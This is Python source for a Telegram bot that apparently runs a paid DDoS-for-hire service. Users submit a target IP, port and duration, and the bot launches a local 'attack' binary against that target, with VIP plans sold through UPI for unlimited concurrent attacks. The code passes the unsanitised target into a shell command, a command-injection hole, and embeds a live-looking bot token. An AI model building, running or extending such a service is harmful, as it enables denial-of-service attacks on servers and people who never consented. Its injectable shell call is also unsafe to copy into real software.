import os
import re
import threading
import time
import json
import datetime
import subprocess
import random
import string
import logging
import urllib.parse

from flask import Flask, request, jsonify, Response
import telebot
from telebot import types
from pymongo import MongoClient, ASCENDING, DESCENDING
from pymongo.errors import DuplicateKeyError

# ============================================================
# CONFIGURATION & LOGGING
# ============================================================

logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

BOT_TOKEN = os.environ.get("BOT_TOKEN", "6400615750:AAHero6NP7UImczIeqmVL76yh4zw2tP893s")
MONGODB_URI = os.environ.get("MONGODB_URI")
UPI_ID = os.environ.get("UPI_ID", "r2frsyt@ptyes")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable is not set")

if not MONGODB_URI:
    raise ValueError("MONGODB_URI environment variable is not set")

OWNER_ID = "6795305850"
ADMIN_IDS = ["6795305850"]

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# User state & active attack tracking
user_states = {}
active_attacks = set()
active_targets = set()
attacks_lock = threading.Lock()

# Flask Health Check Route for Render
@app.route('/')
def index():
    return "R2F BOT IS ACTIVE AND RUNNING SUCCESSFULLY! 🚀", 200

@app.route('/health')
def health():
    return jsonify({"status": "HEALTHY"}), 200

# ============================================================
# MONGODB DATABASE SETUP
# ============================================================

try:
    mongo_client = MongoClient(
        MONGODB_URI,
        serverSelectionTimeoutMS=10000,
        connectTimeoutMS=10000,
        socketTimeoutMS=10000,
    )
    mongo_client.admin.command("ping")
    db = mongo_client["r2f_bot_db"]

    users_collection = db["allowed_users"]
    admins_collection = db["admins"]
    credits_collection = db["user_credits"]
    gift_codes_collection = db["gift_codes"]
    key_prices_collection = db["key_prices"]
    logs_collection = db["command_logs"]

    users_collection.create_index([("user_id", ASCENDING)], unique=True)
    gift_codes_collection.create_index([("code", ASCENDING)], unique=True)
    key_prices_collection.create_index([("duration", ASCENDING)], unique=True)

    print("MongoDB connected successfully with Multi-User & Render support!")

except Exception as e:
    raise RuntimeError(f"MongoDB connection failed: {e}")

# ============================================================
# KEYBOARDS & MENUS (ALL CAPS)
# ============================================================

def get_main_reply_keyboard():
    markup = types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        row_width=2
    )
    markup.add(
        types.KeyboardButton("⚡ QUICK ATTACK"),
        types.KeyboardButton("💎 BUY VIP"),
        types.KeyboardButton("💰 CHECK BALANCE"),
        types.KeyboardButton("📅 DAILY CHECK-IN"),
        types.KeyboardButton("🔗 REFER & EARN"),
        types.KeyboardButton("⚠️ RULES"),
        types.KeyboardButton("🛠️ HELP")
    )
    return markup

def get_help_inline_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📞 CONTACT SUPPORT", callback_data="help_support"),
        types.InlineKeyboardButton("📖 HOW TO USE", callback_data="help_how_to_use"),
        types.InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_to_main")
    )
    return markup

def get_vip_plans_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🌟 WEEK VIP (7 DAYS) - ₹499", callback_data="vip_week"),
        types.InlineKeyboardButton("🔥 MONTH VIP (30 DAYS) - ₹799", callback_data="vip_month"),
        types.InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_to_main")
    )
    return markup

def get_qr_action_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ VERIFY", callback_data="vip_verify"),
        types.InlineKeyboardButton("❌ CANCEL ORDER", callback_data="vip_cancel")
    )
    return markup

# ============================================================
# HELPER FUNCTIONS
# ============================================================

def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def is_user_allowed(user_id):
    if str(user_id) == OWNER_ID or str(user_id) in ADMIN_IDS:
        return True
    user = users_collection.find_one({"user_id": str(user_id)})
    if user:
        if "expiration" in user and user["expiration"]:
            if datetime.datetime.now() > user["expiration"]:
                return False
        return True
    return False

def log_command_db(user_id, target, port, duration):
    try:
        user_info = bot.get_chat(int(user_id))
        username = "@" + user_info.username if user_info.username else f"USERID: {user_id}"
    except Exception:
        username = f"USERID: {user_id}"
    
    logs_collection.insert_one({
        "user_id": str(user_id),
        "username": username,
        "target": target,
        "port": port,
        "duration": duration,
        "timestamp": datetime.datetime.now()
    })

def execute_attack(chat_id, user_id, target, port, attack_time):
    if attack_time > 500:
        bot.send_message(chat_id, "ERROR: ATTACK TIME CANNOT EXCEED 500 SECONDS.")
        with attacks_lock:
            active_attacks.discard((user_id, target))
            active_targets.discard(target)
        return

    log_command_db(user_id, target, port, attack_time)
    
    start_resp = f"R2F POWER START 🚀\n\n🗿 𝐓𝐀𝐑𝐆𝐄𝐓: {target}:{port}\n🕦 ATTACK DURATION: {attack_time}S\n💣 METHOD: LODA-LELE\n\n🔥 STATUS: IN PROGRESS... 🔥"
    bot.send_message(chat_id, start_resp)
    
    full_command = f"./attack {target} {port} {attack_time}"
    
    def run_sub():
        try:
            process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate(timeout=attack_time + 10)
            if process.returncode != 0:
                logging.error(f"Attack binary error (Code {process.returncode}): {stderr.decode('utf-8', errors='ignore')}")
        except Exception as e:
            logging.error(f"Attack execution exception: {e}")

    sub_thread = threading.Thread(target=run_sub, daemon=True)
    sub_thread.start()

    if attack_time > 10:
        time.sleep(attack_time - 10)
        bot.send_message(chat_id, f"⚠️ **ALERT:** ONLY 10 SECONDS REMAINING FOR ATTACK ON `{target}:{port}`!", parse_mode="Markdown")
        time.sleep(10)
    else:
        time.sleep(attack_time)
    
    with attacks_lock:
        active_attacks.discard((user_id, target))
        active_targets.discard(target)
    
    bot.send_message(chat_id, f"BGMI ATTACK FINISHED ✅.\nTARGET: {target} | PORT: {port} | TIME: {attack_time}S")

def try_start_attack(chat_id, user_id, target, port, attack_time):
    if not is_user_allowed(user_id):
        bot.send_message(chat_id, "🚫 UNAUTHORIZED ACCESS!\n\nAAPKE PAAS ATTACK CHALANE KI PERMISSION NAHI HAI. KRIPYA VIP PURCHASE KAREIN.")
        return

    with attacks_lock:
        is_vip_or_admin = (str(user_id) == OWNER_ID or str(user_id) in ADMIN_IDS or users_collection.find_one({"user_id": str(user_id), "is_vip": True}))
        
        user_active_count = sum(1 for u, t in active_attacks if u == user_id)
        if not is_vip_or_admin and user_active_count >= 1:
            bot.send_message(chat_id, "⚠️ **RULE VIOLATION:** AAPKA EK ATTACK PEHLE SE CHAL RAHA HAI! VIP USER BANNE KE LIYE '💎 BUY VIP' PAR CLICK KAREIN.", parse_mode="Markdown")
            return

        if target in active_targets:
            bot.send_message(chat_id, f"⚠️ **TARGET BUSY:** IS IP ({target}) PAR PEHLE SE EK ATTACK CHAL RAHA HAI!", parse_mode="Markdown")
            return

        if not is_vip_or_admin:
            user_data = users_collection.find_one({"user_id": str(user_id)}) or {}
            free_attacks = user_data.get("free_attacks", 5)
            cred_data = credits_collection.find_one({"user_id": str(user_id)}) or {"balance": 0}
            balance = cred_data.get("balance", 0)

            if free_attacks > 0:
                users_collection.update_one({"user_id": str(user_id)}, {"$inc": {"free_attacks": -1}}, upsert=True)
            elif balance >= 15:
                credits_collection.update_one({"user_id": str(user_id)}, {"$inc": {"balance": -15}}, upsert=True)
            else:
                bot.send_message(chat_id, "❌ **INSUFFICIENT BALANCE!** FREE ATTACKS KHATAM HO CHUKE HAIN. 💎 BUY VIP OPTION SE VIP PLAN LEIN.", parse_mode="Markdown")
                return

        active_attacks.add((user_id, target))
        active_targets.add(target)
    
    threading.Thread(target=execute_attack, args=(chat_id, user_id, target, port, attack_time), daemon=True).start()

# ============================================================
# TELEBOT HANDLERS (ALL CAPS)
# ============================================================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    args = message.text.split()
    user_id = str(message.chat.id)
    
    if len(args) > 1 and args[1].startswith("ref_"):
        referrer_id = args[1].replace("ref_", "")
        if referrer_id != user_id:
            existing = users_collection.find_one({"user_id": user_id})
            if not existing:
                credits_collection.update_one(
                    {"user_id": referrer_id},
                    {"$inc": {"balance": 10}},
                    upsert=True
                )
                try:
                    bot.send_message(int(referrer_id), "🎁 REFERRAL SUCCESS! EK NAYE USER NE AAPKI LINK SE JOIN KIYA HAI. AAPKO +10 COINS MILE HAIN!")
                except Exception:
                    pass

    response = (
        f"WELCOME TO R2FSUNILYT MEN MENU\n\n"
        f"🕒 CURRENT TIME: `{get_current_time()}`\n\n"
        "NICHE DIYE GAYE BUTTONS YA OPTIONS KA USE KAREIN:"
    )
    bot.send_message(message.chat.id, response, parse_mode="Markdown", reply_markup=get_main_reply_keyboard())

@bot.callback_query_handler(func=lambda call: call.data == "back_to_main")
def back_to_main_menu(call):
    bot.answer_callback_query(call.id)
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    bot.send_message(
        call.message.chat.id, 
        "WELCOME TO R2FSUNILYT MEN MENU", 
        parse_mode="Markdown", 
        reply_markup=get_main_reply_keyboard()
    )

@bot.message_handler(func=lambda message: message.text == "⚡ QUICK ATTACK")
def quick_attack_prompt(message):
    user_id = str(message.chat.id)
    if not is_user_allowed(user_id):
        bot.send_message(message.chat.id, "🚫 UNAUTHORIZED ACCESS! VIP PLAN LENE KE LIYE '💎 BUY VIP' PAR CLICK KAREIN.")
        return

    user_states[user_id] = {"action": "waiting_quick_attack_input"}
    bot.send_message(
        message.chat.id,
        "⚡ *QUICK ATTACK PANEL*\n\n"
        "APNA **TARGET IP, PORT, AUR TIME** EK SATH SPACE DEKAR SEND KAREIN.\n"
        "👉 *EXAMPLE:* `192.168.1.1 80 300`\n\n"
        "(MAX TIME ALLOWED: 500 SECONDS)",
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: str(message.chat.id) in user_states and user_states[str(message.chat.id)].get("action") == "waiting_quick_attack_input")
def process_quick_attack_input(message):
    user_id = str(message.chat.id)
    state = user_states.pop(user_id, None)
    if not state:
        return

    parts = message.text.strip().split()
    if len(parts) == 3:
        target = parts[0]
        try:
            port = int(parts[1])
            attack_time = int(parts[2])
        except ValueError:
            bot.reply_to(message, "❌ INVALID PORT OR TIME FORMAT. DOBARA TRY KAREIN.")
            return

        if attack_time > 500:
            bot.reply_to(message, "❌ MAX ATTACK TIME 500 SECONDS HAI.")
            return

        try_start_attack(message.chat.id, user_id, target, port, attack_time)
    else:
        bot.reply_to(message, "❌ GALAT FORMAT! KRIPYA IP, PORT, AUR TIME SPACE DEKAR DEIN (JAISE: `192.168.1.1 80 300`)", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "💎 BUY VIP")
def buy_vip_menu(message):
    response = (
        "💎 **R2F VIP SUBSCRIPTION PLANS**\n\n"
        "🌟 **WEEK VIP (7 DAYS):** ₹499\n"
        "   • UNLIMITED ACCESS\n"
        "   • MULTIPLE CONCURRENT ATTACKS\n\n"
        "🔥 **MONTH VIP (30 DAYS):** ₹799\n"
        "   • UNLIMITED ACCESS\n"
        "   • MULTIPLE CONCURRENT ATTACKS\n\n"
        "NICHE DIYE GAYE PLAN PAR CLICK KAREIN:"
    )
    bot.send_message(message.chat.id, response, parse_mode="Markdown", reply_markup=get_vip_plans_keyboard())

@bot.callback_query_handler(func=lambda call: call.data in ["vip_week", "vip_month"])
def vip_plan_selected(call):
    bot.answer_callback_query(call.id)
    user_id = str(call.message.chat.id)
    chat_id = call.message.chat.id
    
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except Exception:
        pass

    duration = "week" if call.data == "vip_week" else "month"
    amount = 499 if duration == "week" else 799
    days = 7 if duration == "week" else 30

    upi_url = f"upi://pay?pa={UPI_ID}&pn=R2F_BOT&am={amount}&cu=INR"
    qr_image_url = f"https://api.qrserver.com/v1/create-qr-code/?size=350x350&data={urllib.parse.quote(upi_url)}"

    caption = (
        f"💎 **@R2FSUNILYT OWNER OF R2FOFFICIAL** 🛡️\n\n"
        f"📦 **PLAN:** {duration.upper()} VIP ({days} DAYS)\n"
        f"💵 **AMOUNT:** ₹{amount}\n"
        f"🆔 **UPI ID:** `{UPI_ID}`\n\n"
        "⚠️ *YE QR CODE SIRF 5 MINUTES KE LIYE VALID HAI!* USKE BAAD AUTOMATIC DELETE HO JAYEGA.\n"
        "1. SCAN KARKE PAYMENT KAREIN.\n"
        "2. PAYMENT SCREENSHOT SEND KAREIN PHIR 'VERIFY' PAR CLICK KAREIN."
    )

    try:
        sent_msg = bot.send_photo(
            chat_id, 
            qr_image_url, 
            caption=caption, 
            parse_mode="Markdown", 
            reply_markup=get_qr_action_keyboard()
        )
        
        user_states[user_id] = {
            "action": "waiting_vip_screenshot",
            "duration": duration,
            "days": days,
            "amount": amount,
            "qr_msg_id": sent_msg.message_id,
            "screenshot_received": False,
            "file_id": None,
            "timestamp": time.time()
        }

        def expire_qr_code():
            time.sleep(300)
            if user_id in user_states and user_states[user_id].get("qr_msg_id") == sent_msg.message_id:
                user_states.pop(user_id, None)
                try:
                    bot.delete_message(chat_id, sent_msg.message_id)
                    bot.send_message(chat_id, "⌛ **QR CODE EXPIRED & DELETED!** 5 MINUTES KA TIME KHATAM HO CHUKA HAI.", parse_mode="Markdown")
                except Exception:
                    pass

        threading.Thread(target=expire_qr_code, daemon=True).start()

    except Exception as e:
        bot.send_message(chat_id, f"QR CODE GENERATE KARNE MEIN ERROR AAYI. UPI ID: `{UPI_ID}` PAR PAY KAREIN (AMOUNT: ₹{amount})", parse_mode="Markdown")

@bot.message_handler(content_types=['photo'], func=lambda message: str(message.chat.id) in user_states and user_states[str(message.chat.id)].get("action") == "waiting_vip_screenshot")
def process_vip_screenshot(message):
    user_id = str(message.chat.id)
    state = user_states.get(user_id)
    
    if not state:
        return

    if time.time() - state["timestamp"] > 300:
        user_states.pop(user_id, None)
        bot.reply_to(message, "❌ **QR EXPIRED!** TIME LIMIT KHATAM HO CHUKI THI.")
        return

    file_id = message.photo[-1].file_id
    state["screenshot_received"] = True
    state["file_id"] = file_id

    bot.reply_to(message, "✅ **SCREENSHOT RECEIVED SUCCESSFULLY!** AB NICHE 'VERIFY' BUTTON PAR CLICK KAREIN.", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data in ["vip_verify", "vip_cancel"])
def handle_vip_qr_actions(call):
    user_id = str(call.message.chat.id)
    chat_id = call.message.chat.id
    state = user_states.get(user_id)

    if call.data == "vip_cancel":
        if state and state.get("qr_msg_id"):
            try:
                bot.delete_message(chat_id, state["qr_msg_id"])
            except Exception:
                pass
        user_states.pop(user_id, None)
        bot.answer_callback_query(call.id, "ORDER CANCELLED!")
        bot.send_message(chat_id, "WELCOME TO R2FSUNILYT MEN MENU", parse_mode="Markdown", reply_markup=get_main_reply_keyboard())
        return

    if call.data == "vip_verify":
        if not state:
            bot.answer_callback_query(call.id, "SESSION EXPIRED!", show_alert=True)
            return

        if not state.get("screenshot_received") or not state.get("file_id"):
            bot.answer_callback_query(call.id, "PLEASE SEND PAYMENT SCREENSHOT THEN CLICK VERIFY", show_alert=True)
            return

        duration = state["duration"]
        days = state["days"]
        amount = state["amount"]
        file_id = state["file_id"]
        qr_msg_id = state.get("qr_msg_id")

        # Delete QR message instantly upon successful verify
        user_states.pop(user_id, None)
        if qr_msg_id:
            try:
                bot.delete_message(chat_id, qr_msg_id)
            except Exception:
                pass

        bot.answer_callback_query(call.id, "VERIFICATION SUBMITTED!")
        bot.send_message(chat_id, "✅ **SCREENSHOT VERIFIED & SENT!** ADMIN KE PAAS APPROVAL KE LIYE BHEJ DIYA GAYA HAI.", parse_mode="Markdown")

        admin_markup = types.InlineKeyboardMarkup(row_width=2)
        admin_markup.add(
            types.InlineKeyboardButton("✅ APPROVE", callback_data=f"vip_app_{user_id}_{duration}"),
            types.InlineKeyboardButton("❌ REJECT", callback_data=f"vip_rej_{user_id}")
        )

        try:
            user_info = bot.get_chat(int(user_id))
            username = "@" + user_info.username if user_info.username else f"ID: {user_id}"
        except Exception:
            username = f"ID: {user_id}"

        admin_caption = (
            f"🔔 **NEW VIP PAYMENT REQUEST**\n\n"
            f"👤 USER: {username} (`{user_id}`)\n"
            f"📦 PLAN: {duration.upper()} ({days} DAYS)\n"
            f"💵 AMOUNT: ₹{amount}"
        )

        try:
            bot.send_photo(int(OWNER_ID), file_id, caption=admin_caption, parse_mode="Markdown", reply_markup=admin_markup)
        except Exception as e:
            logging.error(f"Failed to send VIP screenshot to owner: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("vip_app_") or call.data.startswith("vip_rej_"))
def handle_vip_approval(call):
    if str(call.message.chat.id) != OWNER_ID and str(call.message.chat.id) not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ AAPKE PAAS PERMISSION NAHI HAI!", show_alert=True)
        return

    data = call.data.split("_")
    action = data[1]
    target_user_id = data[2]

    if action == "app":
        duration = data[3]
        days = 7 if duration == "week" else 30
        expiration_date = datetime.datetime.now() + datetime.timedelta(days=days)

        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"expiration": expiration_date, "is_vip": True, "approved_by": str(call.message.chat.id)}},
            upsert=True
        )

        bot.answer_callback_query(call.id, "✅ VIP APPROVED SUCCESSFULLY!")
        bot.edit_message_caption(
            f"{call.message.caption}\n\nSTATUS: **APPROVED ✅** BY ADMIN",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="Markdown"
        )

        try:
            bot.send_message(
                int(target_user_id),
                f"🎉 **VIP ACCESS APPROVED!**\n\nAAPKA {duration.upper()} VIP PLAN ACTIVATE HO GAYA HAI ({days} DAYS). AB AAP UNLIMITED AUR MULTIPLE CONCURRENT ATTACKS RUN KAR SAKTE HAIN! 🚀",
                parse_mode="Markdown"
            )
        except Exception:
            pass

    elif action == "rej":
        bot.answer_callback_query(call.id, "❌ PAYMENT REJECTED.")
        bot.edit_message_caption(
            f"{call.message.caption}\n\nSTATUS: **REJECTED ❌** BY ADMIN",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="Markdown"
        )

        try:
            bot.send_message(
                int(target_user_id),
                "❌ **VIP PAYMENT REJECTED!** AAPKA PAYMENT SCREENSHOT VERIFY NAHI HO PAYA.",
                parse_mode="Markdown"
            )
        except Exception:
            pass

@bot.message_handler(func=lambda message: message.text == "💰 CHECK BALANCE")
def menu_check_balance(message):
    user_id = str(message.chat.id)
    user_cred = credits_collection.find_one({"user_id": user_id})
    balance = user_cred["balance"] if user_cred else 0
    
    user_data = users_collection.find_one({"user_id": user_id}) or {}
    free_attacks = user_data.get("free_attacks", 5)
    is_vip = user_data.get("is_vip", False)
    vip_status = "ACTIVE 🌟" if is_vip and is_user_allowed(user_id) else "INACTIVE ❌"
    
    response = (
        f"💰 **ACCOUNT BALANCE DETAILS:**\n\n"
        f"🪙 COINS BALANCE: `{balance}`\n"
        f"🆓 FREE ATTACKS LEFT: `{free_attacks}`\n\n"
        f"💎 VIP STATUS: `{vip_status}`"
    )
    bot.send_message(message.chat.id, response, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "🔗 REFER & EARN")
def menu_refer_earn(message):
    bot_info = bot.get_me()
    user_id = str(message.chat.id)
    ref_link = f"https://t.me/{bot_info.username}?start=ref_{user_id}"
    
    response = (
        "🔗 **REFER & EARN PROGRAM**\n\n"
        "APNI REFERRAL LINK SHARE KAREIN. JAB KOI NAYA USER JOIN KAREGA, AAPKO **10 COINS** MILENGE!\n\n"
        f"👉 YOUR LINK:\n`{ref_link}`"
    )
    bot.send_message(message.chat.id, response, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "📅 DAILY CHECK-IN")
def menu_daily_checkin(message):
    user_id = str(message.chat.id)
    now = datetime.datetime.now()
    
    user_data = users_collection.find_one({"user_id": user_id}) or {}
    last_checkin = user_data.get("last_checkin")
    
    if last_checkin and (now - last_checkin).total_seconds() < 86400:
        remaining = int(86400 - (now - last_checkin).total_seconds())
        hours = remaining // 3600
        minutes = (remaining % 3600) // 60
        bot.send_message(message.chat.id, f"⏳ AAPNE AAJ KA CHECK-IN ALREADY CLAIM KAR LIYA HAI! AGLA CHECK-IN `{hours}H {minutes}M` BAAD MILEGA.", parse_mode="Markdown")
        return
    
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"last_checkin": now}},
        upsert=True
    )
    credits_collection.update_one(
        {"user_id": user_id},
        {"$inc": {"balance": 20}},
        upsert=True
    )
    bot.send_message(message.chat.id, "🎉 **DAILY CHECK-IN SUCCESSFUL!** AAPKO **20 COINS** REWARD MILE HAIN 🪙.", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "⚠️ RULES")
def menu_rules(message):
    response = (
        "⚠️ **BOT RULES:**\n\n"
        "1. FREE USERS EK WAQT PAR EK HI ATTACK RUN KAR SAKTE HAIN.\n"
        "2. VIP USERS MULTIPLE CONCURRENT ATTACKS RUN KAR SAKTE HAIN.\n"
        "3. MAXIMUM ATTACK TIME LIMIT **500 SECONDS** HAI."
    )
    bot.send_message(message.chat.id, response, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "🛠️ HELP")
def menu_help(message):
    response = (
        "🛠️ *R2F BOT HELP & SUPPORT CENTER*\n\n"
        "NICHE DIYE GAYE BUTTONS PAR CLICK KAREIN:"
    )
    bot.send_message(message.chat.id, response, parse_mode="Markdown", reply_markup=get_help_inline_keyboard())

@bot.callback_query_handler(func=lambda call: call.data == "help_support")
def callback_help_support(call):
    bot.answer_callback_query(call.id)
    bot.send_message(
        call.message.chat.id,
        "📞 *CONTACT SUPPORT*\n\n"
        "KISI BHI PROBLEM YA VIP APPROVAL KE LIYE CONTACT KAREIN:\n"
        f"👉 OWNER ID: `{OWNER_ID}`",
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "help_how_to_use")
def callback_help_tutorial(call):
    bot.answer_callback_query(call.id)
    VIDEO_FILE_ID = "YOUR_VIDEO_FILE_ID_HERE"
    try:
        bot.send_video(
            call.message.chat.id,
            video=VIDEO_FILE_ID,
            caption="📖 *HOW TO USE R2F BOT* TUTORIAL VIDEO",
            parse_mode="Markdown"
        )
    except Exception:
        bot.send_message(
            call.message.chat.id,
            "📖 *HOW TO USE GUIDE*\n\n"
            "1. **⚡ QUICK ATTACK** BUTTON DABAYEIN.\n"
            "2. `IP PORT TIME` SPACE DEKAR BHEJEIN (JAISE: `192.168.1.1 80 300`).\n"
            "3. ATTACK START HONE PAR NOTIFICATION MILEGI.",
            parse_mode="Markdown"
        )

@bot.message_handler(commands=['approveuser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS or user_id == OWNER_ID:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2].lower()
            if duration not in ["day", "week", "month"]:
                bot.send_message(message.chat.id, "INVALID DURATION. USE 'DAY', 'WEEK', OR 'MONTH'.")
                return

            days_add = 1 if duration == "day" else (7 if duration == "week" else 30)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=days_add)
            
            users_collection.update_one(
                {"user_id": user_to_approve},
                {"$set": {"expiration": expiration_date, "approved_by": user_id, "is_vip": True}},
                upsert=True
            )
            response = f"USER {user_to_approve} APPROVED FOR {duration.upper()} 👍."
        else:
            response = "USAGE: /approveuser <id> <duration>"
    else:
        response = "ONLY ADMIN OR OWNER CAN RUN THIS COMMAND 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['redeem'])
def redeem_gift(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        code = command[1]
        gift = gift_codes_collection.find_one({"code": code})
        if gift:
            duration = gift["duration"]
            gift_codes_collection.delete_one({"code": code})
            
            days_add = 1 if duration == "day" else (7 if duration == "week" else 30)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=days_add)
            
            users_collection.update_one(
                {"user_id": user_id},
                {"$set": {"expiration": expiration_date, "is_vip": True}},
                upsert=True
            )
            response = f"GIFT CODE REDEEMED: GRANTED ACCESS FOR {duration.upper()} 🎁."
        else:
            response = "INVALID OR EXPIRED GIFT CODE ❌."
    else:
        response = "USAGE: /redeem <code>"
    bot.send_message(message.chat.id, response)

@bot.message_handler(func=lambda message: message.text and message.text.startswith('/attack'))
def handle_attack(message):
    user_id = str(message.chat.id)
    if not is_user_allowed(user_id):
        bot.send_message(message.chat.id, "🚫 UNAUTHORIZED ACCESS! KRIPYA '💎 BUY VIP' SE PLAN LEIN.")
        return

    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        try:
            port = int(command[2])
            attack_time = int(command[3])
        except ValueError:
            bot.reply_to(message, "INVALID PORT OR TIME FORMAT.")
            return

        if attack_time > 500:
            bot.reply_to(message, "❌ MAX ATTACK TIME LIMIT IS 500 SECONDS.")
            return

        try_start_attack(message.chat.id, user_id, target, port, attack_time)
    else:
        response = "PLEASE PROVIDE ATTACK FORMAT:\n`/attack <host> <port> <time>` OR USE THE **⚡ QUICK ATTACK** BUTTON."
        bot.send_message(message.chat.id, response, parse_mode="Markdown")

# ============================================================
# RUN BOT & FLASK SERVER CONCURRENTLY
# ============================================================

def run_telegram_bot():
    print("Telegram Bot polling started...")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Bot polling error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()

    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
